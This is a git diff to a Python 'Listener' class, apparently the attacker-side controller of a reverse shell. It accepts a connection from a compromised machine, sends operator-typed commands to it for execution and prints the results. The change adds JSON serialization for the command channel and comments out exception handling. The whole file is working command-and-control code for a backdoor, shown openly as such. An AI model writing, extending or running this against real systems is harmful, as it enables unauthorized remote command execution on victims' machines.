@@ -1,6 +1,7 @@
 #!usr/bin/env python3
 import socket
 import sys
+import json
 
 class Listener:
     def __init__(self, ip:str, port:int) -> None:    
@@ -17,15 +18,33 @@ class Listener:
         print(f'[*] Incoming connection from {conn_addr}')
 
 
+    def serial_send(self, data:str) :
+        '''
+        serialize data and send over TCP socket.
+        '''
+        json_data = json.dumps(data)
+        bytes_json_data = bytes(json_data, encoding='utf-8')
+        self.connection.send(bytes_json_data)
+
+
+    def serial_receive(self) -> str :
+        '''
+        receive serialized data over TCP socket
+        and retrieve original data.
+        '''
+        bytes_json_data = self.connection.recv(1024)
+        return json.loads(bytes_json_data)
+
+
     def execute_remotely(self, command):
-        self.connection.send(command)
-        return self.connection.recv(1024).decode('utf-8')
+        self.serial_send(command)
+        return self.serial_receive()
 
 
     def run(self):
         while True:
             try:
-                command = input('>> ').encode('utf-8')
+                command = input('>> ')
                 execution_result = self.execute_remotely(command)
                 print(execution_result)
 
@@ -34,5 +53,5 @@ class Listener:
                 self.server.close()
                 sys.exit()
 
-            except Exception as e:
-                print('[-] Exception : ', e)
+            # except Exception as e:
+            #     print('[-] Exception : ', e)
